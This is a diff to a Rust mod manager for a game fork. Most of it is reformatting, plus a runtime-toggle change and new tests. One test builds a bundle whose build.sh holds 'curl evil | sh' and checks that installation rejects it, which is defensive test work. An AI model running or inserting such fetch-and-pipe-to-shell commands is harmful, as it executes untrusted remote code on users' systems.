@@ -59,11 +59,7 @@ impl Profile {
 
     /// The profile `Settings::native_release` picks.
     pub fn from_setting(release: bool) -> Self {
-        if release {
-            Self::Release
-        } else {
-            Self::Fast
-        }
+        if release { Self::Release } else { Self::Fast }
     }
 }
 
@@ -307,7 +303,8 @@ pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     for path in paths {
         let bundle = horizon_mods::index::native::Bundle::read(&path)
             .map_err(|e| format!("{}: {e}", path.display()))?;
-        if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
+        if !bundle.runtime_toggle() && !crate::browser::java::is_enabled(home, &bundle.manifest.id)
+        {
             continue;
         }
         let dir = out.join(&bundle.manifest.id);
@@ -1244,7 +1241,13 @@ pub fn build(
         .collect();
     // Compatibility pins describe the mod, never the game source in this fork.
     // Always build the fork's current main and refuse hook-version fallbacks.
-    let revision = with_hooks(&mods, crate::fork::build_revision()?, false, || None, hooks_at)?;
+    let revision = with_hooks(
+        &mods,
+        crate::fork::build_revision()?,
+        false,
+        || None,
+        hooks_at,
+    )?;
     let other = mismatch(&mods, &revision);
     if let (Some(list), false) = (&other, anyway) {
         return Err(format!("{MISMATCH}{list}."));
@@ -1256,11 +1259,11 @@ pub fn build(
         repin(b, &revision)?;
     }
     // Said with a failure: a mod made for another revision may not apply or compile on this one.
-    let blame = |e: String| {
-        match &other {
-        Some(list) => format!("{e}\n\nSome mods were made for other Horizon versions ({list}), which may be why. Use mods compatible with this fork."),
+    let blame = |e: String| match &other {
+        Some(list) => format!(
+            "{e}\n\nSome mods were made for other Horizon versions ({list}), which may be why. Use mods compatible with this fork."
+        ),
         None => e,
-    }
     };
     let mixins = newest(
         &mods,
@@ -1597,7 +1600,9 @@ mod tests {
             "horizon": horizon, "mixins": mixins});
         fs::create_dir_all(at.join("mixins").join(id)).unwrap();
         fs::write(at.join(NATIVE_MANIFEST), manifest.to_string()).unwrap();
-        let toml = format!("[mod]\nid = \"{id}\"\nversion = \"0.3.0\"\n[compatibility]\nhorizon_revision = \"{horizon}\"\n");
+        let toml = format!(
+            "[mod]\nid = \"{id}\"\nversion = \"0.3.0\"\n[compatibility]\nhorizon_revision = \"{horizon}\"\n"
+        );
         fs::write(at.join("mixins").join(id).join(MANIFEST), toml).unwrap();
     }
 
@@ -1675,6 +1680,12 @@ mod tests {
             first,
             version_for(A, B, Profile::Fast, &bundles(&out).unwrap()).unwrap()
         );
+        crate::browser::java::set_enabled(&home, "veinminer", false).unwrap();
+        pack("veinminer.hnmod", Some(("mixins/veinminer/data/runtime-toggle.json", r#"{"runtime_toggle":true}"#)));
+        assert_eq!(bundles(&installed_mods(&home).unwrap()).unwrap().len(), 1,
+            "runtime switches keep the code available while disabled");
+        assert_eq!(crate::native_status::enabled(&home).len(), 1);
+        crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
     }
